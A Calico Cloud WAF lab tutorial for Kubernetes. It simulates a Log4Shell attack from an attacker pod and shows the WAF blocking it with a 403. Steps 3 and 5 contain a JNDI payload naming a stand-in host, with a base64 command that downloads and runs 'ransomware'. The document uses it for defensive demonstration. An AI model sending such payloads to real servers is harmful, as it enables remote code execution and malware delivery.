Configuring the Workload-Centric WAF
==============

A web application firewall (WAF) safeguards web applications against a range of application layer attacks, including cross-site scripting (XSS), SQL injection, and cookie poisoning. Given that application attacks are the primary cause of breaches, protecting the HTTP traffic that serves as a gateway to valuable application data is crucial.

## Step 1 - Set up the WAF

Calico Cloud WAF allows you to selectively run service traffic within your cluster and protect intra-cluster traffic from common HTTP-layer attacks. To increase protection, you can use Calico Cloud network policies to enforce security controls on selected pods on the host.

1. Deploy the WAF by running the following command:

   ```bash
   kubectl apply -f waf
   ```

2. Open a new Cloud Shell session and start a pod to simulate an attack on the vote service.

   ```bash
   kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash
   ```

3. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```

4. Now enable the WAF using the following command from your shell (not from the pod attacker).

   ```bash
   kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
   ```

5. Go back to the attack pod, and repeat the request.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```

   You will note that the result will be an HTTP 403 - Forbidden. This reponse returns from the WAF.


